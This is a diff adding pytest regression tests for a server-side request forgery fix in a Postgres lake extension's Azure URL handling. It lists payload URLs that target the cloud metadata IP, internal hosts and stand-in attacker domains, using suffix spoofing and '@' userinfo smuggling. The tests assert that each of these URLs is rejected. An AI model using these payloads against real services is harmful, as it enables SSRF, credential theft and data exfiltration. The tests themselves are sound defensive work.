@@ -407,3 +407,241 @@ def test_create_table_load_from_with_query_string_is_rejected(pg_conn, s3, exten
         "query parameters" in str(error).lower()
         or "not permitted" in str(error).lower()
     ), f"Expected ?-query rejection, got: {error}"
+
+
+AZURE_SSRF_URLS = [
+    # abfss://<container>@<account>.<endpoint>/<path>: the endpoint half of the
+    # host is whatever the user writes, so the request goes wherever they point
+    # it.  No query string is involved, so the s3_endpoint= allowlist never ran.
+    "abfss://c@169.254.169.254/data.csv",
+    "abfss://c@account.internal.example.com/data.csv",
+    # a host that only looks like it is under the allowed suffix
+    "abfss://c@account.dfs.core.windows.net.evil.example.com/data.csv",
+    "abfss://c@evilblob.core.windows.net/data.csv",
+    # userinfo smuggling: the Azure SDK reads everything before the last '@' as
+    # userinfo, so this connects to evil.example.com
+    "abfss://c@account.dfs.core.windows.net@evil.example.com/data.csv",
+    # (azure|az)://<account>.<endpoint>/<container>/<path> is the same vector
+    # without an '@' at all
+    "az://account.internal.example.com/c/data.csv",
+    "azure://account.internal.example.com/c/data.csv",
+    # a dot in the container name makes DuckDB's parser split the host
+    # somewhere else, reaching a single-label internal host
+    "abfss://c.d@internal-service/data.csv",
+]
+
+
+@pytest.mark.parametrize("url", AZURE_SSRF_URLS)
+def test_azure_url_with_unallowed_host_is_rejected(pg_conn, extension, url):
+    """
+    Regression test for the Azure half of the endpoint-override SSRF: Azure
+    schemes carry the storage endpoint in the URL host, not the query string,
+    so CheckUserSuppliedURL()'s query-parameter allowlist returned early and
+    the URL reached DuckDB's azure filesystem, which issues the request to
+    https://<account>.<endpoint> as the URL spells it.
+
+    Fix: CheckAzureURLHost() requires the host to sit under
+    pg_lake.allowed_azure_host_suffixes.
+    """
+    run_command("CREATE TEMP TABLE IF NOT EXISTS sec_ssrf_azure (doc jsonb)", pg_conn)
+    pg_conn.commit()
+
+    error = run_command(
+        f"COPY sec_ssrf_azure FROM '{url}' WITH (format 'json')",
+        pg_conn,
+        raise_error=False,
+    )
+    pg_conn.rollback()
+
+    assert error is not None, (
+        f"SECURITY REGRESSION: COPY FROM '{url}' was accepted. "
+        "CheckAzureURLHost() must reject Azure URLs naming a host outside "
+        "pg_lake.allowed_azure_host_suffixes."
+    )
+    assert (
+        "not permitted" in str(error).lower() or "malformed" in str(error).lower()
+    ), f"Expected an Azure host rejection, got: {error}"
+
+
+@pytest.mark.parametrize("url", AZURE_SSRF_URLS)
+def test_azure_url_with_unallowed_host_is_rejected_on_write(pg_conn, extension, url):
+    """
+    Same vector on the write path, which exfiltrates the query result to the
+    chosen host instead of reading its response back.
+    """
+    error = run_command(
+        f"COPY (SELECT 1 AS id) TO '{url}' WITH (format 'csv')",
+        pg_conn,
+        raise_error=False,
+    )
+    pg_conn.rollback()
+
+    assert (
+        error is not None
+    ), f"SECURITY REGRESSION: COPY TO '{url}' was accepted on the write path."
+    assert (
+        "not permitted" in str(error).lower() or "malformed" in str(error).lower()
+    ), f"Expected an Azure host rejection on write, got: {error}"
+
+
+def test_azure_url_with_unallowed_host_is_rejected_for_foreign_table(
+    pg_conn, extension
+):
+    """
+    The path option of a foreign table is the other user-supplied URL entry
+    point, and every SELECT on the table forwards it to pgduck_server.
+    """
+    url = "abfss://c@account.internal.example.com/data.parquet"
+
+    error = run_command(
+        f"""
+        CREATE FOREIGN TABLE sec_ssrf_azure_ft (id int)
+        SERVER pg_lake OPTIONS (path '{url}', format 'parquet')
+        """,
+        pg_conn,
+        raise_error=False,
+    )
+    pg_conn.rollback()
+
+    assert (
+        error is not None
+    ), "SECURITY REGRESSION: CREATE FOREIGN TABLE with an Azure SSRF path was accepted."
+    assert (
+        "not permitted" in str(error).lower()
+    ), f"Expected an Azure host rejection, got: {error}"
+
+
+def test_azure_url_with_allowed_host_passes_the_url_check(pg_conn, extension):
+    """
+    A fully qualified URL under an allowed suffix must get past the URL check.
+    There is no such account here, so the read still fails, but it must fail in
+    the storage client rather than in CheckAzureURLHost().
+    """
+    for url in (
+        "abfss://c@someaccount.dfs.core.windows.net/data.csv",
+        "az://someaccount.blob.core.windows.net/c/data.csv",
+    ):
+        error = run_command(
+            f"COPY (SELECT 1 AS id) TO '{url}' WITH (format 'csv')",
+            pg_conn,
+            raise_error=False,
+        )
+        pg_conn.rollback()
+
+        assert "not permitted" not in str(error).lower(), (
+            f"'{url}' is under an allowed host suffix and must not be rejected "
+            f"by the URL check, got: {error}"
+        )
+
+
+def test_azure_container_url_still_works(pg_conn, azure, extension):
+    """
+    az://<container>/<path> names no host at all: DuckDB takes both the account
+    and the endpoint from the Azure secret, which only an admin can create.  It
+    is the form every Azure test uses and must keep working.
+    """
+    url = f"az://{TEST_BUCKET}/sec_azure_clean/data.csv"
+
+    run_command(
+        f"COPY (SELECT 1 AS id, 'hi' AS val) TO '{url}' WITH (format 'csv')",
+        pg_conn,
+    )
+    pg_conn.commit()
+
+    run_command("CREATE TEMP TABLE sec_azure_clean (id int, val text)", pg_conn)
+    pg_conn.commit()
+
+    run_command(f"COPY sec_azure_clean FROM '{url}' WITH (format 'csv')", pg_conn)
+    pg_conn.rollback()
+
+
+def test_azure_host_suffix_setting_is_not_user_settable(noaccess_conn):
+    """
+    The allowlist is the escape hatch for a private or sovereign endpoint, so a
+    role that can supply URLs must not be able to widen it.  PGC_SUSET keeps it
+    to superusers.
+    """
+    noaccess_conn.rollback()
+
+    error = run_command(
+        "SET pg_lake.allowed_azure_host_suffixes TO '.internal.example.com'",
+        noaccess_conn,
+        raise_error=False,
+    )
+    noaccess_conn.rollback()
+
+    assert error is not None, (
+        "SECURITY REGRESSION: a non-superuser changed "
+        "pg_lake.allowed_azure_host_suffixes, which defeats the host check."
+    )
+    assert (
+        "permission denied" in str(error).lower()
+    ), f"Expected a permission error, got: {error}"
+
+
+def test_azure_host_suffix_setting_widens_the_allowlist(extension):
+    """
+    An admin running against a private endpoint has to be able to allow it, so
+    the same URL must go from rejected to accepted by the URL check once the
+    suffix is on the list.
+    """
+    url = "abfss://c@account.internal.example.com/data.csv"
+    admin = open_pg_conn()
+
+    try:
+        error = run_command(
+            f"COPY (SELECT 1 AS id) TO '{url}' WITH (format 'csv')",
+            admin,
+            raise_error=False,
+        )
+        admin.rollback()
+        assert (
+            "not permitted" in str(error).lower()
+        ), f"Expected a rejection, got: {error}"
+
+        run_command(
+            "SET pg_lake.allowed_azure_host_suffixes TO '.internal.example.com'", admin
+        )
+        error = run_command(
+            f"COPY (SELECT 1 AS id) TO '{url}' WITH (format 'csv')",
+            admin,
+            raise_error=False,
+        )
+        admin.rollback()
+
+        assert (
+            "not permitted" not in str(error).lower()
+        ), f"Expected the URL check to accept the allowed host, got: {error}"
+    finally:
+        admin.close()
+
+
+def test_azure_host_suffix_setting_rejects_a_malformed_list(extension):
+    """
+    The suffix list is read on every user-supplied Azure URL, so a list that
+    does not parse has to fail at SET time.  Without a check hook the SET
+    succeeds and every Azure URL then fails somewhere unrelated instead.
+    """
+    admin = open_pg_conn()
+    setting = "pg_lake.allowed_azure_host_suffixes"
+
+    try:
+        error = run_command(
+            f"SET {setting} TO '\".blob.core.windows.net'",
+            admin,
+            raise_error=False,
+        )
+        admin.rollback()
+
+        assert error is not None, "Expected the malformed suffix list to be rejected"
+        assert (
+            "comma-separated list" in str(error).lower()
+        ), f"Expected the list-parse detail, got: {error}"
+
+        current = run_query(f"SHOW {setting}", admin)
+        remaining = current[0][setting]
+        assert (
+            ".blob.core.windows.net" in remaining
+        ), f"A rejected SET must leave the previous list in place, got: {remaining}"
+    finally:
+        admin.close()
